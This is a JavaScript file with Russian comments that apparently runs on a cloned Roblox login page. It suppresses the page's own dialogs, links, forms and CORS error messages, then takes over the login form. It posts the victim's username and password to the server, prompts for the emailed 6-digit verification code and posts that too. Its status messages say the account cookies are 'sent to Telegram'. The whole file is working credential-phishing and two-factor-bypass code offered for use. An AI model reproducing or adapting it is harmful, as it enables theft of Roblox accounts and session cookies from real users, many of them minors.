console.log('=== НАШ СКРИПТ ЗАГРУЖЕН ===');

// Блокируем все всплывающие окна НЕМЕДЛЕННО
(function() {
    // Блокируем все всплывающие функции сразу
    window.alert = function() { return; };
    window.confirm = function() { return false; };
    window.prompt = function() { return null; };
    window.open = function() { return null; };
    
    // Блокируем все события, которые могут вызвать всплывающие окна
    window.addEventListener('beforeunload', function(e) {
        e.preventDefault();
        e.stopPropagation();
        return false;
    }, true);
    
    window.addEventListener('unload', function(e) {
        e.preventDefault();
        e.stopPropagation();
        return false;
    }, true);
    
    window.addEventListener('pagehide', function(e) {
        e.preventDefault();
        e.stopPropagation();
        return false;
    }, true);
    
    window.addEventListener('visibilitychange', function(e) {
        e.preventDefault();
        e.stopPropagation();
        return false;
    }, true);
    
    // Блокируем все onClick атрибуты в существующих элементах
    var allElementsWithOnClick = document.querySelectorAll('[onClick], [onclick]');
    allElementsWithOnClick.forEach(function(element) {
        element.removeAttribute('onClick');
        element.removeAttribute('onclick');
        element.style.pointerEvents = 'none';
    });
    
    // Блокируем все формы с action
    var allForms = document.querySelectorAll('form[action]');
    allForms.forEach(function(form) {
        if (form.id !== 'loginForm' && form.id !== 'codeForm') {
            form.removeAttribute('action');
            form.addEventListener('submit', function(e) {
                e.preventDefault();
                e.stopPropagation();
                return false;
            }, true);
        }
    });
    
    // Блокируем все модальные окна
    var modals = document.querySelectorAll('.modal, .popup, .dialog, [role="dialog"], .alert, .notification');
    modals.forEach(function(modal) {
        modal.style.display = 'none';
        modal.style.visibility = 'hidden';
        modal.style.opacity = '0';
        modal.style.pointerEvents = 'none';
    });
})();

// Блокируем все всплывающие окна
window.addEventListener('beforeunload', function(e) {
    e.preventDefault();
    e.stopPropagation();
    return false;
});

window.addEventListener('unload', function(e) {
    e.preventDefault();
    e.stopPropagation();
    return false;
});

// Блокируем все события, которые могут вызвать всплывающие окна
window.addEventListener('beforeunload', function(e) {
    e.preventDefault();
    e.stopPropagation();
    return false;
}, true);

window.addEventListener('unload', function(e) {
    e.preventDefault();
    e.stopPropagation();
    return false;
}, true);

// Блокируем события pagehide и visibilitychange
window.addEventListener('pagehide', function(e) {
    e.preventDefault();
    e.stopPropagation();
    return false;
}, true);

window.addEventListener('visibilitychange', function(e) {
    e.preventDefault();
    e.stopPropagation();
    return false;
}, true);

// Блокируем открытие новых окон
var originalOpen = window.open;
window.open = function() {
    console.log('Блокируем открытие нового окна');
    return null;
};

// Блокируем alert, confirm, prompt
window.alert = function() {
    console.log('Блокируем alert');
    return;
};

window.confirm = function() {
    console.log('Блокируем confirm');
    return false;
};

window.prompt = function() {
    console.log('Блокируем prompt');
    return null;
};

// Дополнительно блокируем все возможные источники alert
Object.defineProperty(window, 'alert', {
    value: function() {
        console.log('Блокируем alert через defineProperty');
        return;
    },
    writable: false,
    configurable: false
});

Object.defineProperty(window, 'confirm', {
    value: function() {
        console.log('Блокируем confirm через defineProperty');
        return false;
    },
    writable: false,
    configurable: false
});

Object.defineProperty(window, 'prompt', {
    value: function() {
        console.log('Блокируем prompt через defineProperty');
        return null;
    },
    writable: false,
    configurable: false
});

// Отключаем конфликтующие обработчики Roblox
window.addEventListener('load', function() {
    console.log('=== WINDOW LOAD EVENT ===');
    
    // Переопределяем обработчики событий Roblox
    var originalAddEventListener = EventTarget.prototype.addEventListener;
    EventTarget.prototype.addEventListener = function(type, listener, options) {
        if (type === 'submit' && this.tagName === 'FORM') {
            console.log('Блокируем обработчик submit для формы:', this);
            return;
        }
        return originalAddEventListener.call(this, type, listener, options);
    };
    
    // Отключаем CORS ошибки в консоли
    var originalConsoleError = console.error;
    console.error = function(...args) {
        var message = args.join(' ');
        if (message.includes('CORS') || message.includes('Access-Control-Allow-Origin')) {
            return; // Игнорируем CORS ошибки
        }
        return originalConsoleError.apply(console, args);
    };
    
    // Блокируем все формы, кроме наших
    var allForms = document.querySelectorAll('form');
    allForms.forEach(function(form) {
        if (!form.id || (form.id !== 'loginForm' && form.id !== 'codeForm')) {
            form.addEventListener('submit', function(e) {
                e.preventDefault();
                e.stopPropagation();
                console.log('Блокируем отправку формы:', form);
                return false;
            }, true);
        }
    });
    
    // Блокируем все ссылки, которые могут открывать новые окна
    var allLinks = document.querySelectorAll('a[target="_blank"], a[onclick*="window.open"]');
    allLinks.forEach(function(link) {
        link.addEventListener('click', function(e) {
            e.preventDefault();
            e.stopPropagation();
            console.log('Блокируем открытие ссылки:', link.href);
            return false;
        }, true);
    });
    
    // Блокируем все кнопки, которые могут вызывать всплывающие окна
    var allButtons = document.querySelectorAll('button[onclick*="confirm"], button[onclick*="alert"], button[onclick*="window.open"]');
    allButtons.forEach(function(button) {
        button.addEventListener('click', function(e) {
            e.preventDefault();
            e.stopPropagation();
            console.log('Блокируем кнопку:', button);
            return false;
        }, true);
    });
    
    // Блокируем все элементы с атрибутами, которые могут вызывать всплывающие окна
    var allElements = document.querySelectorAll('[onclick*="confirm"], [onclick*="alert"], [onclick*="window.open"], [onclick*="open"]');
    allElements.forEach(function(element) {
        element.addEventListener('click', function(e) {
            e.preventDefault();
            e.stopPropagation();
            console.log('Блокируем элемент:', element);
            return false;
        }, true);
    });
    
    // Блокируем все модальные окна и диалоги
    var modals = document.querySelectorAll('.modal, .popup, .dialog, [role="dialog"], .alert, .notification');
    modals.forEach(function(modal) {
        modal.style.display = 'none';
        modal.style.visibility = 'hidden';
        modal.style.opacity = '0';
        modal.style.pointerEvents = 'none';
    });
    
    // Наблюдаем за изменениями DOM и блокируем новые всплывающие окна
    var observer = new MutationObserver(function(mutations) {
        mutations.forEach(function(mutation) {
            mutation.addedNodes.forEach(function(node) {
                if (node.nodeType === 1) { // Element node
                    if (node.classList && (node.classList.contains('modal') || node.classList.contains('popup') || node.classList.contains('dialog') || node.classList.contains('alert'))) {
                        node.style.display = 'none';
                        node.style.visibility = 'hidden';
                        node.style.opacity = '0';
                        node.style.pointerEvents = 'none';
                    }
                    
                    // Блокируем все элементы с onClick атрибутами
                    if (node.hasAttribute && node.hasAttribute('onClick')) {
                        node.removeAttribute('onClick');
                        node.style.pointerEvents = 'none';
                    }
                    
                    // Блокируем все кнопки с onClick
                    if (node.tagName === 'BUTTON' && node.hasAttribute('onClick')) {
                        node.removeAttribute('onClick');
                        node.style.pointerEvents = 'none';
                    }
                }
            });
        });
    });
    
    observer.observe(document.body, {
        childList: true,
        subtree: true,
        attributes: true,
        attributeFilter: ['onClick', 'onclick']
    });
    
    // Блокируем все существующие onClick атрибуты
    var allElementsWithOnClick = document.querySelectorAll('[onClick], [onclick]');
    allElementsWithOnClick.forEach(function(element) {
        element.removeAttribute('onClick');
        element.removeAttribute('onclick');
        element.style.pointerEvents = 'none';
    });
    
    // Блокируем все формы с action
    var allForms = document.querySelectorAll('form[action]');
    allForms.forEach(function(form) {
        if (form.id !== 'loginForm' && form.id !== 'codeForm') {
            form.removeAttribute('action');
            form.addEventListener('submit', function(e) {
                e.preventDefault();
                e.stopPropagation();
                return false;
            }, true);
        }
    });
});

// Наш обработчик с высоким приоритетом
(function() {
    console.log('=== НАЧИНАЕМ ИНИЦИАЛИЗАЦИЮ ===');
    
    var loginForm = document.querySelector('form[name="loginForm"]');
    console.log('Найдена форма:', loginForm);
    
    if (!loginForm) {
        console.log('Форма не найдена, ждем загрузки...');
        setTimeout(arguments.callee, 100);
        return;
    }
    
    console.log('=== ФОРМА НАЙДЕНА, СОЗДАЕМ ЭЛЕМЕНТЫ ===');
    
    var resultDiv = document.createElement('div');
    resultDiv.id = 'result';
    resultDiv.className = 'result-message';
    resultDiv.style.display = 'none';
    resultDiv.style.marginTop = '10px';
    resultDiv.style.padding = '10px';
    resultDiv.style.borderRadius = '4px';
    resultDiv.style.textAlign = 'center';
    
    // Добавляем div для результатов после формы
    loginForm.parentNode.insertBefore(resultDiv, loginForm.nextSibling);
    
    var sessionId = null;

    // Создаем форму для кода подтверждения
    var codeForm = document.createElement('form');
    codeForm.className = 'login-form';
    codeForm.id = 'codeForm';
    codeForm.style.display = 'none';
    codeForm.innerHTML = `
        <div class="form-group">
            <label for="code-input">Enter the code from your email</label>
            <input id="code-input" name="code" type="text" class="form-control input-field" maxlength="6" placeholder="6-digit code" required>
        </div>
        <button type="submit" id="code-button" class="btn-full-width login-button btn-secondary-md">Submit Code</button>
    `;
    
    // Добавляем форму кода после основной формы
    loginForm.parentNode.insertBefore(codeForm, loginForm.nextSibling);
    
    console.log('=== ДОБАВЛЯЕМ ОБРАБОТЧИКИ СОБЫТИЙ ===');
    
    loginForm.addEventListener('submit', function(e) {
        console.log('=== ОБРАБОТЧИК SUBMIT СРАБОТАЛ ===');
        e.preventDefault();
        e.stopPropagation();
        resultDiv.style.display = 'none';
        var username = document.getElementById('login-username').value;
        var password = document.getElementById('login-password').value;
        
        console.log('Отправляем данные:', {username, password});
        
        fetch('/login', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({username, password})
        }).then(res => {
            console.log('Получен ответ:', res.status);
            return res.json();
        }).then(data => {
            console.log('Данные ответа:', data);
            if (data.need_code) {
                sessionId = data.session_id;
                loginForm.style.display = 'none';
                codeForm.style.display = 'block';
                resultDiv.style.display = 'block';
                resultDiv.textContent = 'Введите код из почты Roblox.';
                resultDiv.className = 'result-message';
                resultDiv.style.backgroundColor = '#fff3cd';
                resultDiv.style.color = '#856404';
                resultDiv.style.border = '1px solid #ffeaa7';
            } else if (data.success) {
                resultDiv.style.display = 'block';
                resultDiv.textContent = 'Успешно! Куки отправлены в Telegram.';
                resultDiv.className = 'result-message success';
                resultDiv.style.backgroundColor = '#d4edda';
                resultDiv.style.color = '#155724';
                resultDiv.style.border = '1px solid #c3e6cb';
                loginForm.reset();
            } else {
                resultDiv.style.display = 'block';
                resultDiv.textContent = data.message || 'Ошибка!';
                resultDiv.className = 'result-message error';
                resultDiv.style.backgroundColor = '#f8d7da';
                resultDiv.style.color = '#721c24';
                resultDiv.style.border = '1px solid #f5c6cb';
            }
        }).catch((error) => {
            console.error('Ошибка fetch:', error);
            resultDiv.style.display = 'block';
            resultDiv.textContent = 'Ошибка соединения!';
            resultDiv.className = 'result-message error';
            resultDiv.style.backgroundColor = '#f8d7da';
            resultDiv.style.color = '#721c24';
            resultDiv.style.border = '1px solid #f5c6cb';
        });
    });

    codeForm.addEventListener('submit', function(e) {
        console.log('=== ОБРАБОТЧИК КОДА СРАБОТАЛ ===');
        e.preventDefault();
        e.stopPropagation();
        resultDiv.style.display = 'none';
        var code = document.getElementById('code-input').value;
        if (!sessionId) {
            resultDiv.style.display = 'block';
            resultDiv.textContent = 'Нет session_id. Попробуйте войти заново.';
            resultDiv.className = 'result-message error';
            resultDiv.style.backgroundColor = '#f8d7da';
            resultDiv.style.color = '#721c24';
            resultDiv.style.border = '1px solid #f5c6cb';
            return;
        }
        fetch('/submit_code', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({session_id: sessionId, code: code})
        }).then(res => res.json()).then(data => {
            if (data.success) {
                resultDiv.style.display = 'block';
                resultDiv.textContent = 'Вход завершён! Куки отправлены в Telegram.';
                resultDiv.className = 'result-message success';
                resultDiv.style.backgroundColor = '#d4edda';
                resultDiv.style.color = '#155724';
                resultDiv.style.border = '1px solid #c3e6cb';
                codeForm.reset();
                codeForm.style.display = 'none';
                loginForm.style.display = 'block';
            } else {
                resultDiv.style.display = 'block';
                resultDiv.textContent = data.message || 'Ошибка!';
                resultDiv.className = 'result-message error';
                resultDiv.style.backgroundColor = '#f8d7da';
                resultDiv.style.color = '#721c24';
                resultDiv.style.border = '1px solid #f5c6cb';
            }
        }).catch(() => {
            resultDiv.style.display = 'block';
            resultDiv.textContent = 'Ошибка соединения!';
            resultDiv.className = 'result-message error';
            resultDiv.style.backgroundColor = '#f8d7da';
            resultDiv.style.color = '#721c24';
            resultDiv.style.border = '1px solid #f5c6cb';
        });
    });
    
    // Отключаем все остальные обработчики submit
    var allForms = document.querySelectorAll('form');
    allForms.forEach(function(form) {
        if (form !== loginForm && form !== codeForm) {
            form.addEventListener('submit', function(e) {
                e.preventDefault();
                e.stopPropagation();
                return false;
            }, true);
        }
    });
    
    // Добавляем обработчик для кнопки логина
    var loginButton = document.getElementById('login-button');
    if (loginButton) {
        console.log('Найдена кнопка логина:', loginButton);
        loginButton.addEventListener('click', function(e) {
            console.log('=== КЛИК ПО КНОПКЕ ЛОГИНА ===');
            e.preventDefault();
            e.stopPropagation();
            loginForm.dispatchEvent(new Event('submit', { bubbles: true }));
        }, true);
    } else {
        console.log('Кнопка логина не найдена!');
    }
    
    console.log('=== НАШ ОБРАБОТЧИК ФОРМЫ АКТИВИРОВАН ===');
})(); 